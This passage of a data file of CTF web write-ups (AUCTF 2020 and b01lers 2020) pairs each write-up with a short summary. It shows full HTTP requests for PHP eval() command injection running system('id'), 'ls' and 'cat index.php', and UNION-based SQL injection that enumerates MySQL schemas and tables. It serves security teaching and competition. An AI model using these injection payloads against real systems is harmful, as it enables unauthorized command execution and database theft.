The flag.gz file can be re-created with an hexadecimal editor. If you open the archive you will find the `flag.txt` file with the flag."
"# AUCTF 2020 – Miyazaki Trivia

* **Category:** web
* **Points:** 50

## Challenge

> http://challenges.auctf.com:30020
> 
> Here's a bit of trivia for you vidya game nerds.
> 
> Author: shinigami

## Solution

The website prints a message.

```html
<doctype html>
<html>
	<title>AUCTF</title>
	<body>
		<h1>Find this special file.</h1>
	</body>
</html>
```

Connecting to `http://challenges.auctf.com:30020/robots.txt` will give the following message.

```
VIDEO GAME TRIVIA: What is the adage of Byrgenwerth scholars?

MAKE a GET request to this page with a header named 'answer' to submit your answer.
```

The answer to the trivia is: `Fear the Old Blood`. So you can perform the requested HTTP GET and you will get the flag.

```
GET /robots.txt HTTP/1.1
Host: challenges.auctf.com:30020
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
answer: Fear the Old Blood

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:19:14 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Content-Length: 48
Connection: close
Content-Type: text/html; charset=UTF-8

Master Willem was right.auctf{f3ar_z_olD3_8l0oD}
```","The website prints a message.

Connecting to \robots.txt will give the following message.

So you can perform the requested HTTP GET and you will get the flag."
"# AUCTF 2020 – Quick Maths

* **Category:** web
* **Points:** 50

## Challenge

> http://challenges.auctf.com:30021
> 
> two plus two is four minus three that's one quick maths
> 
> Author: shinigami

## Solution

The website is an on-line calculator.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 15
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement=1%2B1

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:22:19 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Content-Length: 332
Connection: close
Content-Type: text/html; charset=UTF-8


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="""" method=""post"">
<center><h3>Input your expression</h3></center></br>
<center><input type=""text"" name=""statement"" /></center>
<center><input type=""submit""/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2>2</div>

</body>
</html>
```

You can easily trigger an error and discover that it uses PHP `eval()`.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement={{}}

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:23:17 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Content-Length: 440
Connection: close
Content-Type: text/html; charset=UTF-8


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="""" method=""post"">
<center><h3>Input your expression</h3></center></br>
<center><input type=""text"" name=""statement"" /></center>
<center><input type=""submit""/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2><br />
<b>Parse error</b>:  syntax error, unexpected '{' in <b>/var/www/html/index.php(5) : eval()'d code</b> on line <b>1</b><br />
```

So you can use PHP `system()` function to execute commands.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 22
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement=system('id')

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:23:53 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 438


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="""" method=""post"">
<center><h3>Input your expression</h3></center></br>
<center><input type=""text"" name=""statement"" /></center>
<center><input type=""submit""/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2>uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>

</body>
</html>
```

You can list the directory.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement=system('ls -al')

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:26:23 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 560


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="""" method=""post"">
<center><h3>Input your expression</h3></center></br>
<center><input type=""text"" name=""statement"" /></center>
<center><input type=""submit""/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2>total 16
drwxr-xr-x 1 www-data www-data 4096 Apr  3 19:24 .
drwxr-xr-x 1 root     root     4096 Dec 29  2018 ..
-rwxr-xr-x 1 root     root      560 Mar 31 19:34 index.php
-rwxr-xr-x 1 root     root      560 Mar 31 19:34 index.php</div>

</body>
</html>
```

And print the `index.php` file to discover the flag.

```
POST / HTTP/1.1
Host: challenges.auctf.com:30021
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://challenges.auctf.com:30021
Connection: close
Referer: http://challenges.auctf.com:30021/
Upgrade-Insecure-Requests: 1

statement=system('cat index.php')

HTTP/1.1 200 OK
Date: Fri, 03 Apr 2020 19:27:06 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.0.33
Vary: Accept-Encoding
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 898


<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="""" method=""post"">
<center><h3>Input your expression</h3></center></br>
<center><input type=""text"" name=""statement"" /></center>
<center><input type=""submit""/><center>
</form>
</br>
</br>
<div>
<h2>Result</h2><?php
function evaluate(){
	$in = ""echo "" . $_POST['statement'] . "";"";
	$flag = ""auctf{p6p_1nj3c7i0n_iz_k3wl}"";
	$value = eval($in);
	return $value;
}

?>

<html>
</body>
<title>Calc Online</title>
<center><h1>Online Calculator</h1></center>
<form action="""" method=""post"">
<center><h3>Input your expression</h3></center></br>
<center><input type=""text"" name=""statement"" /></center>
<center><input type=""submit""/><center>
</form>
</br>
</br>
<div>
<?php
if (isset($_POST['statement'])){
		echo ""<h2>Result</h2>"";
		echo evaluate();
}
?>
</div>

</body>
</html>
</html></div>

</body>
</html>
```

The flag is the following.

```
auctf{p6p_1nj3c7i0n_iz_k3wl}
```","The website is an on-line calculator.

You can easily trigger an error and discover that it uses PHP eval().

So you can use PHP `system()` function to execute commands.

[HTTP POST request: with a payload that includes a command injection vulnerability]

You can list the directory.

And print the `index.php` file to discover the flag."
"# b01lers CTF 2020 – Life on Mars

* **Category:** web
* **Points:** 100

## Challenge

> We earth men have a talent for ruining big, beautiful things.
> 
> http://web.ctf.b01lers.com:1001/

## Solution

The left menu of the webpage is made up of items calling `get_life()` JavaScript method contained into `http://web.ctf.b01lers.com:1001/static/js/life_on_mars.js` file.

```javascript
function get_life(query) {
  //jquery ajax for querying server
  /*
  response = $.load('/query?search=' + query, function(responseTxt, statusTxt, xhr).parseJSON(response);
    {
    if (statusTxt == ""success"") {

    }
  });

*/
  //alert(query);
  $.ajax({
    type: ""GET"",
    url: ""/query?search="" + query,
    data: ""{}"",
    contentType: ""application/json; charset=utf-8"",
    dataType: ""json"",
    cache: false,
    success: function(data) {
      var table_html =
        '<table id=""results""><tr><th>Name</th><th>Description</th></tr>';
      $.each(data, function(i, item) {
        table_html +=
          ""<tr><td>"" + data[i][0] + ""</td><td>"" + data[i][1] + ""</td></tr>"";
      });
      table_html += ""</table>"";

      $(""#results"").replaceWith(table_html);
    },

    error: function(msg) {
      //alert(msg.responseText);
    }
  });
}
```

This method receives a string in input and uses it to contact a remote service, i.e. `http://web.ctf.b01lers.com:1001/query?search=<param>` endpoint, where requests are done to retrieve data.

The remote service is vulnerable to SQL injection.

```
GET /query?search=amazonis_planitia%20UNION%20SELECT%201%2C%202&{}&_=1584147989793 HTTP/1.1
Host: web.ctf.b01lers.com:1001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 4336
Server: Werkzeug/1.0.0 Python/3.7.3
Date: Sun, 15 Mar 2020 13:24:28 GMT

[[""Advent"",""Humanoid""],[""Aras"",""""],[""Arburian Pelarota"",""Functionally extinct due to the destruction of their home planet Arburia, they are bulky yellow aliens that can curl into a ball, much like apillbug, and are very hard to damage in ball form, and they use this to crush enemies either by bouncing around or rolling over them""],[""Baalols"",""""],[""Bailies"",""Machine race that conquered Earth""],[""Beings of the Extra Terrestrial origin which is Adversary of human race"",""""],[""Brain Dogs"",""""],[""Brikar"",""""],[""Briori"",""""],[""Cthulhi"",""""],[""Daxamites"",""Humanoid""],[""Deep Ones"",""Fish-like humanoids who serve and worship the Great Old Ones known as Father Dagon and Mother Hydra.""],[""Defiance"",""band of many different races""],[""Delvians"",""Humanoid - Similar to humans in appearance, but evolved from plants. Blue, bald, sensitive to sunlight, procreate through air-borne spores.""],[""Demiurg"",""""],[""Denobulans"",""Humanoid""],[""Dom Kavash"",""""],[""Doog"",""Reptiloid with canine features. Extremely dull-witted.""],[""Dremer"",""""],[""Elgyem"",""Maintain Halo Rings, but are not officially part of the Covenant. Large, pink, squid like creatures. No real threat to Humanity other than maintaining the Halo Rings, whicharea threat to humanity.""],[""Eywa"",""""],[""Festival"",""An evil race of bugs that live in the Firebug hive inside of the Lavarynth.""],[""Gashlai"",""Gaseous humanoids, they can either exist in gaseous mediums (such as gas pipes in Victorian Households) or inside the corpses of others.""],[""G'keks"",""""],[""Gnaar"",""""],[""Gowachin"",""""],[""Grendarl"",""Intelligent bipedal species known for their scavenging, hoarding, and trading. Though not a violently aggressive species they are very fond of human blood.""],[""Gretchin"",""""],[""Grogs"",""Humanoid""],[""Hoix"",""""],[""Hooloovoo"",""Ape-like reptilian carnivores""],[""Hoon"",""""],[""Jem'Hadar"",""""],[""Jotoki"",""Their skin is dull yellow, with light brown markings and have beady eyes. Only male Joozians have been shown.""],[""Kafers"",""Humanoid""],[""Kig-yar"",""""],[""Knnn"",""""],[""Lance Corporal Dororo"",""""],[""Leerans"",""""],[""Liir"",""Gelatinous, shapeshifting creatures, they are carnivorous in nature, more specifically preying on elderly humans. They are fond of high levels of heat, but are weak to and deathly afraid of water.""],[""Little Guys"",""""],[""Macra"",""Saber Tyrant""],[""Merseians"",""millipede-like""],[""Micronoids"",""""],[""Mon Calamari"",""""],[""Moroks"",""""],[""Mutons"",""""],[""Nemet"",""Humanoid, completely grey.""],[""Nicassar"",""""],[""Ood"",""""],[""Orandoans"",""Humanoid, Ascended to a higher plain of existence in non-corporial form""],[""Overlords"",""""],[""P'lod"",""""],[""Polymorph"",""""],[""The Prin"",""Humanoid; formidable ancient race of mysterious origin; reside primarily on Phase World, center of the Three Galaxies; possess phase powers, enabling manipulation of physical and dimensional space; generally indifferent to anything that does not pose a threat to themselves or the cosmos as a whole.""],[""Q"",""""],[""Remans"",""""],[""Rodians"",""Humanoid""],[""Sathar"",""""],[""Scrin"",""Humanoid. Genetically engineered offshoot of humans, harvested from Earth 27,000 years ago. Lower heat resistance than humans, but double the average life expectancy""],[""S\u00e9roni"",""Arachnid, capable of phase-shifting to turn invisible""],[""Shevar"",""""],[""Silicoids"",""""],[""Skedar"",""Sessile, plant-like beings mounted in personal mechanical vehicles (skrodes)""],[""Skinnies"",""""],[""Slylandro"",""Humanoid""],[""Snovemdomas"",""""],[""Species"",""""],[""Syreen"",""Humanoid""],[""Tavleks"",""""],[""Aaamazzarite"",""City-sized alien spaceship. Nickname given by Cassie Sullivan. They created a series of waves to wipe out humanity and invade Earth.""],[""Titanide"",""""],[""Traskans"",""Compare with the earlierflat catsfromRobert A. Heinlein's<a href=/wiki/The_Rolling_Stones_(novel) title=The Rolling Stones (novel)>The Rolling Stones</a>.""],[""Vorcarian bloodtracker"",""""],[""Xel'Naga"",""""],[""Yanme'e"",""Slug-like parasites. They need a host to see, walk, and communicate, and are the main antagonists of the Animorphs series, intent on enslaving other species.""],[""Yridian"",""Alternative name for the humanoidIridonianrace whose most distinctive feature is the array of small horns on top of their heads.  Their home planet isIridonia, though they have established many colonies on planets throughout the galaxy.<a href=#cite_note-Wizards-1>[1]</a>The most well known member isDarth Maul.""],[""1"",""2""]]
```

At this point, you can discover that the used DBMS is MySQL version 5.7.29.

```
GET /query?search=amazonis_planitia%20union%20select%20%40%40version%2C%201&{}&_=1584147989793 HTTP/1.1
Host: web.ctf.b01lers.com:1001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 4341
Server: Werkzeug/1.0.0 Python/3.7.3
Date: Sun, 15 Mar 2020 13:30:32 GMT

[[""Advent"",""Humanoid""],[""Aras"",""""],[""Arburian Pelarota"",""Functionally extinct due to the destruction of their home planet Arburia, they are bulky yellow aliens that can curl into a ball, much like apillbug, and are very hard to damage in ball form, and they use this to crush enemies either by bouncing around or rolling over them""],[""Baalols"",""""],[""Bailies"",""Machine race that conquered Earth""],[""Beings of the Extra Terrestrial origin which is Adversary of human race"",""""],[""Brain Dogs"",""""],[""Brikar"",""""],[""Briori"",""""],[""Cthulhi"",""""],[""Daxamites"",""Humanoid""],[""Deep Ones"",""Fish-like humanoids who serve and worship the Great Old Ones known as Father Dagon and Mother Hydra.""],[""Defiance"",""band of many different races""],[""Delvians"",""Humanoid - Similar to humans in appearance, but evolved from plants. Blue, bald, sensitive to sunlight, procreate through air-borne spores.""],[""Demiurg"",""""],[""Denobulans"",""Humanoid""],[""Dom Kavash"",""""],[""Doog"",""Reptiloid with canine features. Extremely dull-witted.""],[""Dremer"",""""],[""Elgyem"",""Maintain Halo Rings, but are not officially part of the Covenant. Large, pink, squid like creatures. No real threat to Humanity other than maintaining the Halo Rings, whicharea threat to humanity.""],[""Eywa"",""""],[""Festival"",""An evil race of bugs that live in the Firebug hive inside of the Lavarynth.""],[""Gashlai"",""Gaseous humanoids, they can either exist in gaseous mediums (such as gas pipes in Victorian Households) or inside the corpses of others.""],[""G'keks"",""""],[""Gnaar"",""""],[""Gowachin"",""""],[""Grendarl"",""Intelligent bipedal species known for their scavenging, hoarding, and trading. Though not a violently aggressive species they are very fond of human blood.""],[""Gretchin"",""""],[""Grogs"",""Humanoid""],[""Hoix"",""""],[""Hooloovoo"",""Ape-like reptilian carnivores""],[""Hoon"",""""],[""Jem'Hadar"",""""],[""Jotoki"",""Their skin is dull yellow, with light brown markings and have beady eyes. Only male Joozians have been shown.""],[""Kafers"",""Humanoid""],[""Kig-yar"",""""],[""Knnn"",""""],[""Lance Corporal Dororo"",""""],[""Leerans"",""""],[""Liir"",""Gelatinous, shapeshifting creatures, they are carnivorous in nature, more specifically preying on elderly humans. They are fond of high levels of heat, but are weak to and deathly afraid of water.""],[""Little Guys"",""""],[""Macra"",""Saber Tyrant""],[""Merseians"",""millipede-like""],[""Micronoids"",""""],[""Mon Calamari"",""""],[""Moroks"",""""],[""Mutons"",""""],[""Nemet"",""Humanoid, completely grey.""],[""Nicassar"",""""],[""Ood"",""""],[""Orandoans"",""Humanoid, Ascended to a higher plain of existence in non-corporial form""],[""Overlords"",""""],[""P'lod"",""""],[""Polymorph"",""""],[""The Prin"",""Humanoid; formidable ancient race of mysterious origin; reside primarily on Phase World, center of the Three Galaxies; possess phase powers, enabling manipulation of physical and dimensional space; generally indifferent to anything that does not pose a threat to themselves or the cosmos as a whole.""],[""Q"",""""],[""Remans"",""""],[""Rodians"",""Humanoid""],[""Sathar"",""""],[""Scrin"",""Humanoid. Genetically engineered offshoot of humans, harvested from Earth 27,000 years ago. Lower heat resistance than humans, but double the average life expectancy""],[""S\u00e9roni"",""Arachnid, capable of phase-shifting to turn invisible""],[""Shevar"",""""],[""Silicoids"",""""],[""Skedar"",""Sessile, plant-like beings mounted in personal mechanical vehicles (skrodes)""],[""Skinnies"",""""],[""Slylandro"",""Humanoid""],[""Snovemdomas"",""""],[""Species"",""""],[""Syreen"",""Humanoid""],[""Tavleks"",""""],[""Aaamazzarite"",""City-sized alien spaceship. Nickname given by Cassie Sullivan. They created a series of waves to wipe out humanity and invade Earth.""],[""Titanide"",""""],[""Traskans"",""Compare with the earlierflat catsfromRobert A. Heinlein's<a href=/wiki/The_Rolling_Stones_(novel) title=The Rolling Stones (novel)>The Rolling Stones</a>.""],[""Vorcarian bloodtracker"",""""],[""Xel'Naga"",""""],[""Yanme'e"",""Slug-like parasites. They need a host to see, walk, and communicate, and are the main antagonists of the Animorphs series, intent on enslaving other species.""],[""Yridian"",""Alternative name for the humanoidIridonianrace whose most distinctive feature is the array of small horns on top of their heads.  Their home planet isIridonia, though they have established many colonies on planets throughout the galaxy.<a href=#cite_note-Wizards-1>[1]</a>The most well known member isDarth Maul.""],[""5.7.29"",""1""]]
```

Database schemas can be read.

```
GET /query?search=amazonis_planitia%20UNION%20SELECT%20schema_name%2C%201%20FROM%20information_schema.schemata&{}&_=1584147989793 HTTP/1.1
Host: web.ctf.b01lers.com:1001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 4387
Server: Werkzeug/1.0.0 Python/3.7.3
Date: Sun, 15 Mar 2020 13:38:09 GMT

[[""Advent"",""Humanoid""],[""Aras"",""""],[""Arburian Pelarota"",""Functionally extinct due to the destruction of their home planet Arburia, they are bulky yellow aliens that can curl into a ball, much like apillbug, and are very hard to damage in ball form, and they use this to crush enemies either by bouncing around or rolling over them""],[""Baalols"",""""],[""Bailies"",""Machine race that conquered Earth""],[""Beings of the Extra Terrestrial origin which is Adversary of human race"",""""],[""Brain Dogs"",""""],[""Brikar"",""""],[""Briori"",""""],[""Cthulhi"",""""],[""Daxamites"",""Humanoid""],[""Deep Ones"",""Fish-like humanoids who serve and worship the Great Old Ones known as Father Dagon and Mother Hydra.""],[""Defiance"",""band of many different races""],[""Delvians"",""Humanoid - Similar to humans in appearance, but evolved from plants. Blue, bald, sensitive to sunlight, procreate through air-borne spores.""],[""Demiurg"",""""],[""Denobulans"",""Humanoid""],[""Dom Kavash"",""""],[""Doog"",""Reptiloid with canine features. Extremely dull-witted.""],[""Dremer"",""""],[""Elgyem"",""Maintain Halo Rings, but are not officially part of the Covenant. Large, pink, squid like creatures. No real threat to Humanity other than maintaining the Halo Rings, whicharea threat to humanity.""],[""Eywa"",""""],[""Festival"",""An evil race of bugs that live in the Firebug hive inside of the Lavarynth.""],[""Gashlai"",""Gaseous humanoids, they can either exist in gaseous mediums (such as gas pipes in Victorian Households) or inside the corpses of others.""],[""G'keks"",""""],[""Gnaar"",""""],[""Gowachin"",""""],[""Grendarl"",""Intelligent bipedal species known for their scavenging, hoarding, and trading. Though not a violently aggressive species they are very fond of human blood.""],[""Gretchin"",""""],[""Grogs"",""Humanoid""],[""Hoix"",""""],[""Hooloovoo"",""Ape-like reptilian carnivores""],[""Hoon"",""""],[""Jem'Hadar"",""""],[""Jotoki"",""Their skin is dull yellow, with light brown markings and have beady eyes. Only male Joozians have been shown.""],[""Kafers"",""Humanoid""],[""Kig-yar"",""""],[""Knnn"",""""],[""Lance Corporal Dororo"",""""],[""Leerans"",""""],[""Liir"",""Gelatinous, shapeshifting creatures, they are carnivorous in nature, more specifically preying on elderly humans. They are fond of high levels of heat, but are weak to and deathly afraid of water.""],[""Little Guys"",""""],[""Macra"",""Saber Tyrant""],[""Merseians"",""millipede-like""],[""Micronoids"",""""],[""Mon Calamari"",""""],[""Moroks"",""""],[""Mutons"",""""],[""Nemet"",""Humanoid, completely grey.""],[""Nicassar"",""""],[""Ood"",""""],[""Orandoans"",""Humanoid, Ascended to a higher plain of existence in non-corporial form""],[""Overlords"",""""],[""P'lod"",""""],[""Polymorph"",""""],[""The Prin"",""Humanoid; formidable ancient race of mysterious origin; reside primarily on Phase World, center of the Three Galaxies; possess phase powers, enabling manipulation of physical and dimensional space; generally indifferent to anything that does not pose a threat to themselves or the cosmos as a whole.""],[""Q"",""""],[""Remans"",""""],[""Rodians"",""Humanoid""],[""Sathar"",""""],[""Scrin"",""Humanoid. Genetically engineered offshoot of humans, harvested from Earth 27,000 years ago. Lower heat resistance than humans, but double the average life expectancy""],[""S\u00e9roni"",""Arachnid, capable of phase-shifting to turn invisible""],[""Shevar"",""""],[""Silicoids"",""""],[""Skedar"",""Sessile, plant-like beings mounted in personal mechanical vehicles (skrodes)""],[""Skinnies"",""""],[""Slylandro"",""Humanoid""],[""Snovemdomas"",""""],[""Species"",""""],[""Syreen"",""Humanoid""],[""Tavleks"",""""],[""Aaamazzarite"",""City-sized alien spaceship. Nickname given by Cassie Sullivan. They created a series of waves to wipe out humanity and invade Earth.""],[""Titanide"",""""],[""Traskans"",""Compare with the earlierflat catsfromRobert A. Heinlein's<a href=/wiki/The_Rolling_Stones_(novel) title=The Rolling Stones (novel)>The Rolling Stones</a>.""],[""Vorcarian bloodtracker"",""""],[""Xel'Naga"",""""],[""Yanme'e"",""Slug-like parasites. They need a host to see, walk, and communicate, and are the main antagonists of the Animorphs series, intent on enslaving other species.""],[""Yridian"",""Alternative name for the humanoidIridonianrace whose most distinctive feature is the array of small horns on top of their heads.  Their home planet isIridonia, though they have established many colonies on planets throughout the galaxy.<a href=#cite_note-Wizards-1>[1]</a>The most well known member isDarth Maul.""],[""information_schema"",""1""],[""alien_code"",""1""],[""aliens"",""1""]]
```

Database schemas are:
* `information_schema`;
* `alien_code`;
* `aliens`.

Tables names for each schema can be read.

```
GET /query?search=amazonis_planitia%20UNION%20SELECT%20table_schema%2C%20table_name%20FROM%20information_schema.tables%20WHERE%20table_schema%20IN%20%28%27alien_code%27%2C%20%27aliens%27%29&{}&_=1584147989793 HTTP/1.1
Host: web.ctf.b01lers.com:1001
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:73.0) Gecko/20100101 Firefox/73.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://web.ctf.b01lers.com:1001/

HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 4594
Server: Werkzeug/1.0.0 Python/3.7.3
Date: Sun, 15 Mar 2020 13:42:15 GMT

[[""Advent"",""Humanoid""],[""Aras"",""""],[""Arburian Pelarota"",""Functionally extinct due to the destruction of their home planet Arburia, they are bulky yellow aliens that can curl into a ball, much like apillbug, and are very hard to damage in ball form, and they use this to crush enemies either by bouncing around or rolling over them""],[""Baalols"",""""],[""Bailies"",""Machine race that conquered Earth""],[""Beings of the Extra Terrestrial origin which is Adversary of human race"",""""],[""Brain Dogs"",""""],[""Brikar"",""""],[""Briori"",""""],[""Cthulhi"",""""],[""Daxamites"",""Humanoid""],[""Deep Ones"",""Fish-like humanoids who serve and worship the Great Old Ones known as Father Dagon and Mother Hydra.""],[""Defiance"",""band of many different races""],[""Delvians"",""Humanoid - Similar to humans in appearance, but evolved from plants. Blue, bald, sensitive to sunlight, procreate through air-borne spores.""],[""Demiurg"",""""],[""Denobulans"",""Humanoid""],[""Dom Kavash"",""""],[""Doog"",""Reptiloid with canine features. Extremely dull-witted.""],[""Dremer"",""""],[""Elgyem"",""Maintain Halo Rings, but are not officially part of the Covenant. Large, pink, squid like creatures. No real threat to Humanity other than maintaining the Halo Rings, whicharea threat to humanity.""],[""Eywa"",""""],[""Festival"",""An evil race of bugs that live in the Firebug hive inside of the Lavarynth.""],[""Gashlai"",""Gaseous humanoids, they can either exist in gaseous mediums (such as gas pipes in Victorian Households) or inside the corpses of others.""],[""G'keks"",""""],[""Gnaar"",""""],[""Gowachin"",""""],[""Grendarl"",""Intelligent bipedal species known for their scavenging, hoarding, and trading. Though not a violently aggressive species they are very fond of human blood.""],[""Gretchin"",""""],[""Grogs"",""Humanoid""],[""Hoix"",""""],[""Hooloovoo"",""Ape-like reptilian carnivores""],[""Hoon"",""""],[""Jem'Hadar"",""""],[""Jotoki"",""Their skin is dull yellow, with light brown markings and have beady eyes. Only male Joozians have been shown.""],[""Kafers"",""Humanoid""],[""Kig-yar"",""""],[""Knnn"",""""],[""Lance Corporal Dororo"",""""],[""Leerans"",""""],[""Liir"",""Gelatinous, shapeshifting creatures, they are carnivorous in nature, more specifically preying on elderly humans. They are fond of high levels of heat, but are weak to and deathly afraid of water.""],[""Little Guys"",""""],[""Macra"",""Saber Tyrant""],[""Merseians"",""millipede-like""],[""Micronoids"",""""],[""Mon Calamari"",""""],[""Moroks"",""""],[""Mutons"",""""],[""Nemet"",""Humanoid, completely grey.""],[""Nicassar"",""""],[""Ood"",""""],[""Orandoans"",""Humanoid, Ascended to a higher plain of existence in non-corporial form""],[""Overlords"",""""],[""P'lod"",""""],[""Polymorph"",""""],[""The Prin"",""Humanoid; formidable ancient race of mysterious origin; reside primarily on Phase World, center of the Three Galaxies; possess phase powers, enabling manipulation of physical and dimensional space; generally indifferent to anything that does not pose a threat to themselves or the cosmos as a whole.""],[""Q"",""""],[""Remans"",""""],[""Rodians"",""Humanoid""],[""Sathar"",""""],[""Scrin"",""Humanoid. Genetically engineered offshoot of humans, harvested from Earth 27,000 years ago. Lower heat resistance than humans, but double the average life expectancy""],[""S\u00e9roni"",""Arachnid, capable of phase-shifting to turn invisible""],[""Shevar"",""""],[""Silicoids"",""""],[""Skedar"",""Sessile, plant-like beings mounted in personal mechanical vehicles (skrodes)""],[""Skinnies"",""""],[""Slylandro"",""Humanoid""],[""Snovemdomas"",""""],[""Species"",""""],[""Syreen"",""Humanoid""],[""Tavleks"",""""],[""Aaamazzarite"",""City-sized alien spaceship. Nickname given by Cassie Sullivan. They created a series of waves to wipe out humanity and invade Earth.""],[""Titanide"",""""],[""Traskans"",""Compare with the earlierflat catsfromRobert A. Heinlein's<a href=/wiki/The_Rolling_Stones_(novel) title=The Rolling Stones (novel)>The Rolling Stones</a>.""],[""Vorcarian bloodtracker"",""""],[""Xel'Naga"",""""],[""Yanme'e"",""Slug-like parasites. They need a host to see, walk, and communicate, and are the main antagonists of the Animorphs series, intent on enslaving other species.""],[""Yridian"",""Alternative name for the humanoidIridonianrace whose most distinctive feature is the array of small horns on top of their heads.  Their home planet isIridonia, though they have established many colonies on planets throughout the galaxy.<a href=#cite_note-Wizards-1>[1]</a>The most well known member isDarth 